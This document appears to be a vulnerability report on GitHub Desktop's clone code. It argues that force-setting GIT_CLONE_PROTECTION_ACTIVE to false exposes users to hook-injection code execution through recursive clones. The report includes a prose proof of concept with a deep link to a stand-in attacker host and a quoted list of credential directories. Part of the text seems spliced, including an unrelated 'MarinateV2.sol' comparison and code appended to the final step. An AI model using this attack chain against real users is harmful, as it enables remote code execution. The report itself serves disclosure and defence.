## Finding

`clone.ts` explicitly disables a git safety check that git itself introduced specifically to stop malicious *repository content* from achieving code execution during `--recursive` clones. [1](#0-0) 

### Title
Git clone-time hook-injection protection is force-disabled via `GIT_CLONE_PROTECTION_ACTIVE=false` - (File: app/src/lib/git/clone.ts)

### Summary
`git clone` gained a runtime safety check (the fix behind Git's CVE‑2024‑32002 class of bugs) that aborts a recursive clone when a malicious repository tries to smuggle a `.git`/hooks path onto disk via case-insensitive or symlinked filesystem tricks embedded in the tree/submodule structure — this is exactly the "attacker controls a cloned/fetched repository" primitive named in the Valid Impact rules. GitHub Desktop's `clone()` function unconditionally sets `GIT_CLONE_PROTECTION_ACTIVE: 'false'` in the environment for every `git clone --recursive` invocation, turning this protection off instead of validating/limiting it, mirroring the `MarinateV2.sol` pattern of a guard that exists but whose configured value is never bounded/validated before being applied.

### Finding Description
`clone()` builds the environment for the clone process and always includes:
```
const env = {
  ...(await envForRemoteOperation(url)),
  GIT_CLONE_PROTECTION_ACTIVE: 'false',
}
...
args.push('clone', '--recursive')
``` [2](#0-1) 

`--recursive` is always passed, so submodules are always fetched and checked out as part of the clone. The `GIT_CLONE_PROTECTION_ACTIVE` variable is git's own kill-switch for the hardening it added against symlinked/case-collision `.git` directories nested inside cloned/submodule trees, which otherwise let a crafted repository write files (including hooks) outside the intended working tree and get them executed. Desktop hard-codes this to `'false'` unconditionally for every clone — the value is never validated, scoped, or made conditional on trust in the remote; it's applied identically whether the URL came from a manually typed input or from an attacker-controlled deep link (`x-github-client://openRepo/<url>` handled by `parseAppURL` / `dispatchURLAction` → `openOrCloneRepository` → `CloningRepositoriesStore.clone` → this `clone()` call). [3](#0-2) [4](#0-3) [5](#0-4) 

The destination-path hardening in the same file (`isClonePathSensitive`) only stops the clone from *landing in* a sensitive local directory — it does nothing to stop the clone from *executing content* the attacker placed inside the fetched repository/submodules once git's own protection has been disabled. [6](#0-5) 

### Impact Explanation
Because the protection env var is force-disabled for every clone, a crafted remote repository (the exact "attacker controls a cloned/fetched repository" scenario named as valid) that abuses case-insensitive filesystems or symlinked submodule paths to place a payload at a `.git/hooks`-equivalent location can have that payload executed on the victim's machine during `git clone --recursive`, i.e., arbitrary code execution outside the intended repository content — the same class of outcome the Valid Impact section calls out explicitly.

### Likelihood Explanation
Every code path that results in a clone — manual "Clone repository" UI, CLI `--cli-clone`, and the deep-link `open-repository-from-url` action reachable from a link the user clicks — funnels through this single `clone()` function, so the disabled protection applies universally and requires no unusual configuration by the victim; the only user action needed is following a malicious clone link/URL and confirming the (already prefilled) Clone dialog, which is a normal, expected interaction rather than an unnatural step.

### Recommendation
Do not statically force `GIT_CLONE_PROTECTION_ACTIVE: 'false'`. Rely on git's default (protection enabled) for recursive clones, or at minimum gate disabling it behind an explicit, validated opt-in rather than applying it unconditionally to every clone regardless of remote trust.

### Proof of Concept
1. Host a malicious git repository containing a submodule/tree structure crafted to exploit the case-insensitive/symlink `.git` hook-injection technique that `GIT_CLONE_PROTECTION_ACTIVE` was designed to block.
2. Send the victim a deep link: `x-github-client://openRepo/https://attacker.example/evil-repo.git`.
3. Victim clicks the link, Desktop opens the Clone dialog prefilled with the URL (`openOrCloneRepository` / `CloneRepository` UI), and clicks "Clone".
4. `Dispatcher.clone` → `CloningRepositoriesStore.clone` → `clone()` runs `git -c ... clone --recursive -- <url> <path>` with `GIT_CLONE_PROTECTION_ACTIVE=false`, disabling the guard that would otherwise reject the payload, allowing the attacker's hook/content to execute on the victim's machine. function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
